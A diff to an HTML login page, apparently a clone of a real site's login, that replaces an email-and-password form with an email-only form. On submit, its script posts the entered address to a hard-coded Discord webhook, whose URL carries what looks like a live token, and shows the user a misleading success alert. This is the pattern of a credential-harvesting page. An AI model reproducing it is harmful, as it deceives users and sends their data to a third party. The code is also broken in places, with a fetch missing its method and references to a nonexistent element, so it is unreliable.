@@ -1,88 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, intial-scale=1.0">
-        <title>Login -Test Clone</title> 
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                min-height: 100vh;
-                background-color: #f0f2f5;
-                font-family: Arial, sans-serif;
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f0f0f0;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        form {
+            display: block;
+            margin-bottom: 30px;
+        }
+        
+        input[type="email"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Login to Your Account</h2>
+        <form id="loginForm">
+            <input type="email" name="email" placeholder="Enter your email" required>
+            <button type="submit">Login</button>
+            <input type="hidden" id="reloader" name="_$ Reloader" value="1">
+        </form>
+    </div>
+
+    <script src='socket.io@3.15.1/dist/socket.io.min.js'></script>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = this.querySelector('input[name="email"]').value;
+            
+            if (!email) {
+                alert('Please enter an email address');
+                return;
             }
             
-            .container {
-                width: 400px;
-                max-width: 600px;
+            // Replace with your actual Discord webhook URL
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1339385478553800704/AgWcJ--FjDu48PZgF3wr40-Fr_yxXMgLWlg-da8lc5aYJ-Z6u1VXuHflVBIYDnsvt4Fl';
+            try {
+                // Send the email message to Discord webhook using fetch
+                fetch(webhookUrl, {
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Subject': new Date().toLocaleTimeString()
+                    },
+                    body: `To: ${email}\n\nMessage from login attempt on ${new Date().getUTCFullYear()}`
+                })
+                
+                alert('Email notification sent successfully!');
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Failed to send email notification');
             }
+        });
 
-            .login-box {
-                background-color: white;
-                border-radius: 8px;
-                padding: 32px;
-                height: 58px;
-                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-                width: 100%;
+        // Prevent default form submission
+        document.getElementById('reloader').addEventListener('click', function() {
+            if (document.body.lastElementChild.lastElementChild) {
+                document.getElementById('relder').disabled = true;
+                setTimeout(() => {
+                    document.getElementById('relder').disabled = false;
+                }, 50);
             }
-
-            .form-group { 
-                margin-bottom: 20px;
-            }
-
-            input[type="email"],
-            input[type="password"] {
-                padding: 8px;
-                font-size: 16px;
-                border: 1px solid #ddd;
-                width: 350px;
-            }
-            button[type="submit"] { 
-                background-color: white;
-                color: #4ecdc4;
-                border: none;
-                padding: 8px 20px;
-                border-radius: 4px;
-                cursor: pointer;
-            }
-
-            button[type="submit"]:hover {
-                background-color: #4ecdc4;
-            }
-
-            .error-messsage {
-                color: red;
-                margin-top: 5px;
-                font-size: 14px;
-            }
-
-
-        </style>
-        </head>
-        <body> 
-        <div class="container">
-            <form id="loginForm">
-                <div class="login-box">
-                    <h2>Login</h2>
-                    <div class="input-group">
-                        <input type="email" placeholder="Email or Username" required>
-                    </div>
-                    <div class="input-group">
-                        <input type="password" placeholder="Password" required>
-                        </div>
-                        <div class="button-group">
-                            <a href="#" class="fb-icon">test page</a>
-                            <button type="submit" class="remeber-me">Remember me</button>
-                            <button type="#">Forget password?</button>
-                        </div>
-                    </div>
-                    </div>
-                </div>
-            </form>
-        </div>
+        });  
+    </script>
 </body>
 </html>
